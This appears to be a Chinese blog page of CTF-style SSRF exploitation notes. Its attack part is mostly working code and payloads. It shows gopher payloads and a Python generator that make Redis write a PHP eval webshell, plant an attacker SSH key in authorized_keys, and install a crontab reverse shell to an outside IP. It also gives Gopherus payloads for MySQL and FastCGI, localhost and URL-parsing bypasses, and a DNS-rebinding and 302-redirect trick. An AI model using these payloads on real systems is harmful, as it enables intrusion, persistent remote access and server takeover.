+<h3 id="绝对路径写webshell-gopher"><a href="#绝对路径写webshell-gopher" class="headerlink" title="绝对路径写webshell(gopher)"></a>绝对路径写webshell(gopher)</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>开启了radis服务</p>
+<p>使用gopher构造payload：</p>
+<p><img src="/images/image-20220910170904843.png" alt="image-20220910170904843"></p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2429%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B1%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>_后面需要url编码：</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">=gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252429%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B1%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="绝对路径写webshell"><a href="#绝对路径写webshell" class="headerlink" title="绝对路径写webshell"></a>绝对路径写webshell</h3><p>这个方法比较常用，也是用得最多的&#x3D;。&#x3D;</p>
+<h4 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h4><p>构造redis命令</p>
+<pre class="line-numbers language-php-template" data-language="php-template"><code class="language-php-template">flushall
+set 1 &#39;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#39;
+config set dir &#x2F;var&#x2F;www&#x2F;html
+config set dbfilename shell.php
+save
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>写了一个简单的脚本，转化为redis RESP协议的格式(<strong>gopher化URL</strong>)</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib
+protocol<span class="token operator">=</span><span class="token string">"gopher://"</span>
+ip<span class="token operator">=</span><span class="token string">"192.168.163.128"</span>
+port<span class="token operator">=</span><span class="token string">"6379"</span>
+shell<span class="token operator">=</span><span class="token string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?>\n\n"</span>
+filename<span class="token operator">=</span><span class="token string">"shell.php"</span>
+path<span class="token operator">=</span><span class="token string">"/var/www/html"</span>
+passwd<span class="token operator">=</span><span class="token string">""</span>
+cmd<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"flushall"</span><span class="token punctuation">,</span>
+     <span class="token string">"set 1 &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>shell<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+     <span class="token string">"config set dir &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">,</span>
+     <span class="token string">"config set dbfilename &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span>
+     <span class="token string">"save"</span>
+     <span class="token punctuation">]</span>
+<span class="token keyword">if</span> passwd<span class="token punctuation">:</span>
+    cmd<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"AUTH &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
+payload<span class="token operator">=</span>protocol<span class="token operator">+</span>ip<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>port<span class="token operator">+</span><span class="token string">"/_"</span>
+<span class="token keyword">def</span> <span class="token function">redis_format</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    CRLF<span class="token operator">=</span><span class="token string">"\r\n"</span>
+    redis_arr <span class="token operator">=</span> arr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>
+    cmd<span class="token operator">=</span><span class="token string">""</span>
+    cmd<span class="token operator">+=</span><span class="token string">"*"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>redis_arr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> x <span class="token keyword">in</span> redis_arr<span class="token punctuation">:</span>
+        cmd<span class="token operator">+=</span>CRLF<span class="token operator">+</span><span class="token string">"$"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>CRLF<span class="token operator">+</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span>
+    cmd<span class="token operator">+=</span>CRLF
+    <span class="token keyword">return</span> cmd
+
+<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> x <span class="token keyword">in</span> cmd<span class="token punctuation">:</span>
+        payload <span class="token operator">+=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>redis_format<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span> payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/images/640.jfif" alt="img"></p>
+<p>生成payload后，用<code>curl</code>打一波</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> 脚本跑出来的<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/640.jfif" alt="img"></p>
+<p>执行成功，我们看一波shell是否写入成功</p>
+<p><img src="/images/640.png" alt="img"></p>
+<p>成功写入</p>
+<h3 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h3><p>如果<code>.ssh</code>目录存在，则直接写入<code>~/.ssh/authorized_keys</code><br><strong>如果不存在，则可以利用 crontab 创建该目录</strong></p>
+<h4 id="构造payload-1"><a href="#构造payload-1" class="headerlink" title="构造payload"></a>构造payload</h4><p>构造redi</p>
+<p><img src="/images/640.jfif" alt="img"></p>
+<p>s命令</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flushall
+<span class="token builtin class-name">set</span> <span class="token number">1</span> <span class="token string">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali
+'</span>
+config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /root/.ssh/
+config <span class="token builtin class-name">set</span> dbfilename authorized_keys
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>转化为redis RESP协议的格式<br><strong>PS：将第一个脚本改一下</strong></p>
+<pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">filename</span><span class="token punctuation">=</span><span class="token value attr-value">"<span class="token inner-value">authorized_keys</span>"</span>
+<span class="token key attr-name">ssh_pub</span><span class="token punctuation">=</span><span class="token value attr-value">"<span class="token inner-value">\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n\n</span>"</span>
+<span class="token key attr-name">path</span><span class="token punctuation">=</span><span class="token value attr-value">"<span class="token inner-value">/root/.ssh/</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>生成payload</p>
+<p><img src="/images/640-1662801329023.jfif" alt="img"></p>
+<p><code>curl</code>打一波</p>
+<p><img src="/images/640.jfif" alt="img"></p>
+<p>我们来查看一波是否成功写入</p>
+<p><img src="/images/640.jfif" alt="img"></p>
+<p>成功写入，尝试连接</p>
+<p><img src="/images/640-1662700429984.png" alt="img"></p>
+<p>成功连接</p>
+<h3 id="利用contrab计划任务反弹shell"><a href="#利用contrab计划任务反弹shell" class="headerlink" title="利用contrab计划任务反弹shell"></a>利用contrab计划任务反弹shell</h3><p>这个方法只能<code>Centos</code>上使用，<code>Ubuntu上行不通</code>，原因如下：</p>
+<ol>
+<li>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600也就是<code>-rw-------</code>才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行</li>
+<li>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</li>
+</ol>
+<p>由于系统的不同，crontrab定时文件位置也会不同<br>Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code><br>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code><br>Centos和Ubuntu均存在的（需要root权限）<code>/etc/crontab</code> PS：高版本的redis默认启动是<code>redis</code>权限，故写这个文件是行不通的</p>
+<h4 id="构造payload-2"><a href="#构造payload-2" class="headerlink" title="构造payload"></a>构造payload</h4><p>构造redis的命令如下：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flushall
+<span class="token builtin class-name">set</span> <span class="token number">1</span> <span class="token string">'\n\n*/1 * * * * bash -i >&amp; /dev/tcp/192.168.163.132/2333 0>&amp;1\n\n'</span>
+config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron/
+config <span class="token builtin class-name">set</span> dbfilename root
+save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>转化为redis RESP协议的格式<br><strong>PS：将第一个脚本改一下</strong></p>
+<pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">reverse_ip</span><span class="token punctuation">=</span><span class="token value attr-value">"<span class="token inner-value">192.168.163.132</span>"</span>
+<span class="token key attr-name">reverse_port</span><span class="token punctuation">=</span><span class="token value attr-value">"<span class="token inner-value">2333</span>"</span>
+<span class="token key attr-name">cron</span><span class="token punctuation">=</span><span class="token value attr-value">"\n\n\n\n*/1 * * * * bash -i >&amp; /dev/tcp/%s/%s 0>&amp;1\n\n\n\n"%(reverse_ip,reverse_port)</span>
+<span class="token key attr-name">filename</span><span class="token punctuation">=</span><span class="token value attr-value">"<span class="token inner-value">root</span>"</span>
+<span class="token key attr-name">path</span><span class="token punctuation">=</span><span class="token value attr-value">"<span class="token inner-value">/var/spool/cron</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>生成一波，尝试反弹shell</p>
+<p><img src="/images/640.jfif" alt="img"></p>
+<p><img src="/images/640.jfif" alt="img"></p>
+<p>成功反弹shell</p>
+<h2 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h2><p>Fastcgi其实是一个<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE&spm=1001.2101.3001.7020">通信协议</a>，和HTTP协议一样，都是进行数据交换的一个通道。</p>
+<p>PHP-FPM又是什么东西？</p>
+<p>FPM其实是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。</p>
+<p>FPM按照fastcgi的协议将TCP流解析成真正的数据。</p>
+<h3 id="用gopherus工具"><a href="#用gopherus工具" class="headerlink" title="用gopherus工具"></a>用gopherus工具</h3><blockquote>
+<p>–exploit fastcgi</p>
+<p>找到一个必然存在的php文件（最好是绝对路径）</p>
+<p>执行命令</p>
+<p>ls &#x2F;</p>
+<p>cat &#x2F;flag……</p>
+</blockquote>
+<h2 id="攻击mysql"><a href="#攻击mysql" class="headerlink" title="攻击mysql"></a>攻击mysql</h2><p>打无密码的mysql</p>
+<p><img src="/images/image-20220910152134541.png" alt="image-20220910152134541"></p>
+<p>抓包</p>
+<p><img src="/images/image-20220910152148016.png" alt="image-20220910152148016"></p>
+<p>发现returl中存在https:&#x2F;&#x2F; 协议，可能存在ssrf，可以使用ssrf打mysql</p>
+<p><strong>可以用gopherus工具</strong></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gopherus <span class="token parameter variable">--exploit</span> mysql 
+Give MySQL username: root
+Give query to execute: <span class="token keyword">select</span> <span class="token string">"&lt;?php eval(<span class="token variable">$_POST</span>[1]); ?>"</span> into outfile <span class="token string">"/var/www/html/a.php"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/images/image-20220910152718515.png" alt="image-20220910152718515"></p>
+<p>payload：</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%46%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%20%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%61%2e%70%68%70%22%01%00%00%00%01<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>但是不可以直接使用，</p>
+<p>需要将_后面的字符进行再次url编码</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2546%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2531%255d%2529%253b%2520%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2522%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2561%252e%2570%2568%2570%2522%2501%2500%2500%2500%2501<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="127-0-0-1-x3D"><a href="#127-0-0-1-x3D" class="headerlink" title="127.0.0.1&#x3D;"></a>127.0.0.1&#x3D;</h2><blockquote>
+<p>sudo.cc</p>
+<p>0</p>
+<p>0.0.0.0</p>
+<p>127.0.1</p>
+<p>127.1</p>
+<p>0x7f000001</p>
+<p>八进制（0开头）</p>
+<p>localhost</p>
+</blockquote>
+<h2 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h2><h3 id="Web浏览器同源策略-SOP"><a href="#Web浏览器同源策略-SOP" class="headerlink" title="Web浏览器同源策略(SOP)"></a>Web浏览器同源策略(SOP)</h3><p><strong>同源策略（Same origin policy）</strong> 是一个重要的安全策略，它用于<strong>限制一个<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Glossary/Origin">origin</a>的文档或者它加载的脚本如何能与另一个源的资源进行交互</strong>。它能帮助阻隔恶意文档，减少可能被攻击的媒介。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/PsgQ/">https://www.cnblogs.com/PsgQ/</a> 这个网址中， https 是协议， <a href="http://www.cnblogs.com是域名，端口是443（https协议默认端口可以省略，你也可以把他看成：https://www.cnblogs.com:443/PsgQ/）。任意两个网址，只要这三点(协议、域名、端口号)全部相同，那么浏览器就认为它们是同源的，任意一个不相同都会被浏览器认为是跨域。">www.cnblogs.com是域名，端口是443（https协议默认端口可以省略，你也可以把他看成：https://www.cnblogs.com:443/PsgQ/）。任意两个网址，只要这三点(协议、域名、端口号)全部相同，那么浏览器就认为它们是同源的，任意一个不相同都会被浏览器认为是跨域。</a></p>
+<p>IE浏览器对于同源策略有两个主要的例外：</p>
+<p>授信范围（Trust Zones）：两个相互之间高度互信的域名，如公司域名（corporate domains），不遵守同源策略的限制。<br>端口：IE浏览器没有将端口号加入到同源策略的组成部分之中，因此 <a target="_blank" rel="noopener" href="http://example.com:81/index.html">http://example.com:81/index.html</a> 和 <a target="_blank" rel="noopener" href="http://example.com/index.html">http://example.com/index.html</a> 属于同源并且不受任何限制。</p>
+<p>在浏览器中, <script> 、<img>、<iframe>、<link>等标签都可以跨域加载,而不受浏览器的同源策略的限制, 这些带src属性的标签每次加载的时候,实际上都是浏览器发起一次GET请求, 不同于普通请求(XMLHTTPRequest)的是,通过src属性加载的资源,浏览器限制了JavaScript的权限,使其不能读写src加载返回的内容</p>
+<h3 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h3><p>在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。</p>
+<p>简单来说就是一个不同的域名对应了不同的ip地址，但是浏览器无法察觉，导致攻击</p>
+<p>使用<img src="/images/image-20220909150135086.png" alt="image-20220909150135086">重绑定DNS</p>
+<p><img src="/images/image-20220909150122672.png" alt="image-20220909150122672"></p>
+<p>第一个随便填，第二个127.0.0.1</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;/br>'</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/br>'</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_IP</span><span class="token punctuation">,</span> <span class="token class-name">FILTER_FLAG_NO_PRIV_RANGE</span> <span class="token operator">|</span> <span class="token class-name">FILTER_FLAG_NO_RES_RANGE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ip!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>url=http://r.t162d4.ceye.io/flag.php</code></p>
+<h2 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h2><p>还是上面的源码</p>
+<p>在VPS中编写index.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: http://127.0.0.1/flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><code>url=http://175.178.196.226/302.php</code></p>
+<h2 id="绕过开头、结尾限制"><a href="#绕过开头、结尾限制" class="headerlink" title="@,?绕过开头、结尾限制"></a>@,?绕过开头、结尾限制</h2> <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^http:\/\/ctf\..*show$/i'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+  <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>url=http://ctf.@127.0.0.1/flag.php?show</code></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
